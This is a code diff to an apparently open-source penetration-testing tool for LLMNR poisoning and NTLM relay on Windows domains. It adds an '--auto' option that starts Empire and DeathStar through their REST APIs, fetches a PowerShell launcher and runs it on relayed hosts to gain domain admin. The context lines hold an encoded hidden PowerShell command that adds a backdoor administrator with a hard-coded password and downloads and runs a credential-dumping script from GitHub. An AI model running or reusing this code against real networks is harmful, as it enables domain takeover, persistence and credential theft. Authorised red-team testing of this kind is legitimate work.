@@ -35,6 +35,7 @@ def parse_args():
     parser.add_argument("-t", "--time", default='10', help="Number of minutes to run the LLMNR/Responder attack; defaults to 10m")
     parser.add_argument("-i", "--interface", help="Interface to use with Responder")
     parser.add_argument("-c", "--command", help="Remote command to run upon successful NTLM relay")
+    parser.add_argument("--auto", action="store_true", help="Start up Empire and DeathStar to automatically get domain admin")
     return parser.parse_args()
 
 def parse_nmap(args):
@@ -748,6 +749,8 @@ def run_relay_attack(iface, args):
 
     if args.command:
         remote_cmd = args.command
+    elif args.auto:
+        remote_cmd = get_empire_launcher_cmd()
     else:
         # net user /add icebreaker P@ssword123456; net localgroup administrators icebreaker /add; IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/DanMcInerney/Obf-Cats/master/Obf-Cats.ps1'); Obf-Cats -pwds
         remote_cmd = 'powershell -nop -exec bypass -w hidden -enc bgBlAHQAIAB1AHMAZQByACAALwBhAGQAZAAgAGkAYwBlAGIAcgBlAGEAawBlAHIAIABQAEAAcwBzAHcAbwByAGQAMQAyADMANAA1ADYAOwAgAG4AZQB0ACAAbABvAGMAYQBsAGcAcgBvAHUAcAAgAGEAZABtAGkAbgBpAHMAdAByAGEAdABvAHIAcwAgAGkAYwBlAGIAcgBlAGEAawBlAHIAIAAvAGEAZABkADsAIABJAEUAWAAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcABzADoALwAvAHIAYQB3AC4AZwBpAHQAaAB1AGIAdQBzAGUAcgBjAG8AbgB0AGUAbgB0AC4AYwBvAG0ALwBEAGEAbgBNAGMASQBuAGUAcgBuAGUAeQAvAE8AYgBmAC0AQwBhAHQAcwAvAG0AYQBzAHQAZQByAC8ATwBiAGYALQBDAGEAdABzAC4AcABzADEAJwApADsAIABPAGIAZgAtAEMAYQB0AHMAIAAtAHAAdwBkAHMADQAKAA=='
@@ -1058,6 +1061,54 @@ def check_for_nse_scripts(hosts):
         return False
     else:
         return True
+
+def run_proc_xterm(cmd):
+    xterm_cmd = 'xterm -hold -e {}'
+    full_cmd = xterm_cmd.format(cmd)
+    print(full_cmd)
+    print('[*] Running: {}'.format(full_cmd))
+    # Split it only on xterm args, leave system command in 1 string
+    cmd_split = full_cmd.split(' ',3)
+    proc = Popen(cmd_split, stdout=PIPE, stderr=PIPE)
+    return proc
+
+def get_token(base_url):
+    login_opts = {'username':'icebreaker', 'password':'P@ssword123456'}
+    r = requests.post(base_url + '/api/admin/login', json=login_opts, verify=False) 
+    if r.status_code == 200:
+        print(r.json())
+        resp_json = r.json()['token']
+        return resp_json
+    print(r.json())
+    raise
+
+def get_launcher_cmd(base_url, token):
+    stager_opts = {'StagerName':'multi/launcher', 'Listener':'DeathStar'}
+    r = requests.post(base_url + '/api/stagers?token={}'.format(token), json=stager_opts, verify=False) 
+    if r.status_code == 200:
+        # resp = {'multi/launcher':{'Output':'powershell.exe -NoP...'}
+        launcher_cmd = r.json()['multi/launcher']['Output']
+        return launcher_cmd
+    print(r.json())
+    raise
+
+def get_empire_launcher_cmd():
+    base_url = 'https://0.0.0.0:1337'
+    user = 'icebreaker'
+    passwd = 'P@ssword123456'
+    empire_cmd = 'cd submodules/Empire;python2 empire --rest --username icebreaker --password P@ssword123456'
+    ds_cmd = 'python submodules/DeathStar/DeathStar.py -u icebreaker -p P@ssword123456'
+
+    empire_proc = run_proc_xterm(empire_cmd)
+    # Time for Empire to load
+    time.sleep(10)
+    ds_proc = run_proc_xterm(ds_cmd)
+    token = get_token(base_url)
+    # Time for DeathStar to start listener
+    time.sleep(5)
+    launcher_cmd = get_launcher_cmd(base_url, token)
+
+    return launcher_cmd
 
 def remote_scf_cleanup():
     '''
